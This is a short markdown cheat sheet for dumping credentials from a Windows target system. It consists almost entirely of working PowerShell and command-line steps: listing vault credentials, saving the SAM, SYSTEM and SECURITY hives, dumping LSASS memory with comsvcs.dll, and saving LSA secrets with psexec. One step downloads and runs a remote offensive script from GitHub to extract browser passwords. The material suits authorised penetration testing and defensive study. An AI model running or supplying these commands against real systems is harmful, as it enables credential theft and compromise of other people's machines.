# Dump Credentials

We can leverage these methods to dump various credentials of a target system.

## Dump Credentials

- Microsoft Credentials

    ```powershell
    vaultcmd /listcreds:"Windows Credentials" /all
    ```

- Browser Credentials

    This command dumps credentials stored in browsers.

    ```powershell
    iex(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')
    Kittielocal -noninteractive -browsercredentials
    ```

## Dump Registry Hives

- Registry

    ```powershell
    reg save HKLM\SECURITY .\security.bak
    reg save HKLM\SYSTEM .\system.bak
    reg save HKLM\SAM .\sam.bak
    ```

- Esentutl

    These commands copy the registry hives to each file with Volume Shadow Copies (vss)

    ```powershell
    esentutl /y /vss C:\Windows\System32\config\SECURITY /d .\security.bak
    esentutl /y /vss C:\Windows\System32\config\SYSTEM /d .\system.bak
    esentutl /y /vss C:\Windows\System32\config\SAM /d .\sam.bak
    ```

## Dump LSASS Memory

The LSASS memory may contain sensitive information, so we want to dump the memory:

```powershell
# 1. Find the PID of LSASS process
tasklist
# or
Get-Process

# 2. Dump LSASS memory. Replace <LSASS_PID> with actual PID
rundll32 C:\Windows\System32\comsvcs.dll,MiniDump <LSASS_PID> C:\lsass.dmp full
```

## Dump LSA Secrets

```powershell
psexec -accepteula -s reg save HKLM\Security\Policy\Secrets C:\Users\<user>\Desktop\secrets /y
```

After dumping, the file can be extracted using some tools such as Mimikatz.

## Find Sensitive Words

The following command finds `password` strings in Registry.

```powershell
reg query HKLM /f password /t REG_SZ /s
```